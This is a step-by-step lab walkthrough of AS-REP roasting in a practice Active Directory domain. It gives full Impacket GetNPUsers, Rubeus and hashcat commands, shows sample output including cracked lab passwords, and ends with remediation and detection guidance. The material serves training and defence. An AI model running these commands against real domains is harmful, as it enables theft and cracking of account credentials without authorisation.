# 03 — AS-REP Roasting (T1558.004)

When an account has the `DONT_REQ_PREAUTH` (Do not require Kerberos preauthentication) flag set, the KDC will return an AS-REP to anyone who asks — without the requester proving they know the password. Part of that AS-REP is encrypted with the target's password-derived key, so an attacker can harvest it and crack it offline. This walkthrough roasts the three planted pre-auth-disabled accounts (`jon.snow`, `arya.stark`, `sansa.stark`) with Impacket's `GetNPUsers.py` and Rubeus, then cracks them with hashcat. Unlike Kerberoasting, this needs **no credentials at all** if you can supply candidate usernames.

**MITRE ATT&CK Technique**: [T1558.004 — Steal or Forge Kerberos Tickets: AS-REP Roasting](https://attack.mitre.org/techniques/T1558/004/)

## Prerequisites
- Network access to the KDC on the forest root DC `kingslanding` (192.168.56.10, Kerberos/88).
- A list of candidate usernames (from BloodHound enumeration in attack 01, anonymous LDAP, or a name list). For the credential-less path no password is needed; for `Rubeus` you need a domain context on `braavos`.
- A wordlist for offline cracking (`rockyou.txt`).

## Tools
- Impacket v0.12.0 (`GetNPUsers.py`) — run on the Linux attacker (192.168.56.1).
- Rubeus v2.3.2 — run on `braavos` (192.168.56.14) for the in-domain alternative.
- hashcat v6.2.6 — run on the Linux attacker (mode `-m 18200` for `$krb5asrep$`).

## Step-by-step Commands

### Step 1 — (Linux attacker, 192.168.56.1) Credential-less AS-REP roast against a username list
Feed candidate usernames via `-usersfile`. `-no-pass` tells Impacket not to attempt a bind — it just requests AS-REPs and keeps the ones from pre-auth-disabled accounts.
```bash
printf 'jon.snow\narya.stark\nsansa.stark\n' > users.txt
GetNPUsers.py {{DOMAIN}}/ -dc-ip {{DC_IP}} -no-pass -usersfile users.txt \
  -format hashcat -outputfile asrep_hashes.txt
# {{DOMAIN}} = sevenkingdoms.local, {{DC_IP}} = 192.168.56.10
```

### Step 2 — (Linux attacker, 192.168.56.1) Authenticated discovery of all pre-auth-disabled accounts
If you already hold any valid credential, let the KDC tell you which accounts are vulnerable rather than guessing names.
```bash
# {{LAB_PASSWORD}} = Password123!
GetNPUsers.py {{DOMAIN}}/arya.stark:'{{LAB_PASSWORD}}' -dc-ip {{DC_IP}} \
  -request -format hashcat -outputfile asrep_hashes.txt
```

![Step 2](../screenshots/attack-3-step-2.png)

### Step 3 — (braavos, 192.168.56.14) Alternative: AS-REP roast from a Windows domain context with Rubeus
```powershell
cd C:\Tools\Rubeus
.\Rubeus.exe asreproast /format:hashcat /nowrap /outfile:C:\Tools\Rubeus\asrep.txt
# Single target:
.\Rubeus.exe asreproast /user:jon.snow /format:hashcat /nowrap
```

![Step 3](../screenshots/attack-3-step-3.png)

### Step 4 — (Linux attacker, 192.168.56.1) Crack the AS-REP hashes with hashcat
Mode 18200 is the Kerberos 5 AS-REP etype 23 format.
```bash
hashcat -m 18200 -a 0 asrep_hashes.txt /usr/share/wordlists/rockyou.txt
hashcat -m 18200 asrep_hashes.txt --show
```

![Step 4](../screenshots/attack-3-step-4.png)

## Expected Output

Credential-less roast (Step 1):
```text
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies

[*] Getting TGT for jon.snow
$krb5asrep$23$jon.snow@SEVENKINGDOMS.LOCAL:f4a1c8e2b6d9...
[*] Getting TGT for arya.stark
$krb5asrep$23$arya.stark@SEVENKINGDOMS.LOCAL:7c2e9b1d5f8a...
[*] Getting TGT for sansa.stark
$krb5asrep$23$sansa.stark@SEVENKINGDOMS.LOCAL:b9d4f1a6c3e7...
```

Authenticated discovery (Step 2) — full sample hash (truncated):
```text
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies

Name         MemberOf  PasswordLastSet      LastLogon  UAC      
-----------  --------  -------------------  ---------  --------
jon.snow               2026-02-11 09:10:21  <never>    0x410200 
arya.stark             2026-02-11 09:10:22  <never>    0x410200 
sansa.stark            2026-02-11 09:10:22  <never>    0x410200 

$krb5asrep$23$jon.snow@SEVENKINGDOMS.LOCAL:f4a1c8e2b6d903a7c1e5b8d2f6a4c9e0$
3b7d1f9c5a2e8b4d6f0c3a9e7b1d5f8c2a6e4b0d9f3c7a1e5b8d2f6a4c0e9b3d7f1a5c8e2b6
d4f0a9c3e7b1d5f8c2a6e4b0d9f3c7a1e5b8d2f6a4c0e9b3d7f1a5c8e2b6d4f0a9c3e7b1d5
...c8a2e6b4d0f9c3a7e1b5d8f2c6a4e0b9d3f7c1a5e8b2d6f4a0c9e3b7d1f5a8c2e6b4d0f9$
```

Rubeus output (Step 3):
```text
  v2.3.2

[*] Action: AS-REP roasting

[*] Target Domain          : sevenkingdoms.local

[*] SamAccountName         : jon.snow
[*] DistinguishedName      : CN=jon.snow,CN=Users,DC=north,DC=sevenkingdoms,DC=local
[*] Using domain controller: kingslanding.sevenkingdoms.local (192.168.56.10)
[*] Building AS-REQ (no preauth) for: 'sevenkingdoms.local\jon.snow'
[+] AS-REQ w/o preauth successful!
[*] Hash written to C:\Tools\Rubeus\asrep.txt
```

hashcat crack (Step 4):
```text
$krb5asrep$23$jon.snow@SEVENKINGDOMS.LOCAL:f4a1c8e2b6d9...:Password123!
$krb5asrep$23$arya.stark@SEVENKINGDOMS.LOCAL:7c2e9b1d5f8a...:Winter1s!Coming
$krb5asrep$23$sansa.stark@SEVENKINGDOMS.LOCAL:b9d4f1a6c3e7...:Password123!

Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 18200 (Kerberos 5, etype 23, AS-REP)
Recovered........: 3/3 (100.00%) Digests
```

## Cleanup Steps
- On the Linux attacker: `rm -f users.txt asrep_hashes.txt hashcat.potfile`.
- On `braavos`: `Remove-Item C:\Tools\Rubeus\asrep.txt` and `klist purge` to clear cached AS-REP material.
- No directory objects were modified. Do not clear the `DONT_REQ_PREAUTH` flag on the three accounts — leave the lab state intact for re-runs.
- Requested AS-REPs leave no persistent server-side artifact beyond the security logs.

## What This Tells You About AD
AS-REP roasting is a configuration vulnerability, not a protocol flaw: Kerberos pre-authentication exists precisely to stop an attacker from extracting an offline-crackable blob without proving knowledge of the password. Disabling pre-auth (often done decades ago for legacy clients or by accident through templates) re-opens that hole, and crucially it requires **no credentials** — only a valid username — making it usable at the very start of an engagement. The remediation is simple and high-value: enumerate every account with `DONT_REQ_PREAUTH` (`userAccountControl` bit `0x400000`), re-enable pre-authentication, and ensure those accounts have strong passwords and AES encryption. That `jon.snow`, `arya.stark`, and `sansa.stark` are all roastable here demonstrates how a single inherited template setting can expose a whole population of accounts.

## Detection Reference
See [../detection/kql-queries.md#3-as-rep-roasting](../detection/kql-queries.md#3-as-rep-roasting) for the AS-REP request signatures (Event ID 4768 with `Pre-Authentication Type 0` and RC4 ticket encryption, plus bursts of AS-REQ failures during username spraying).

---
Last updated: 2026-05-17

MITRE references:
- [T1558.004 — Steal or Forge Kerberos Tickets: AS-REP Roasting](https://attack.mitre.org/techniques/T1558/004/)
- [TA0006 — Credential Access](https://attack.mitre.org/tactics/TA0006/)
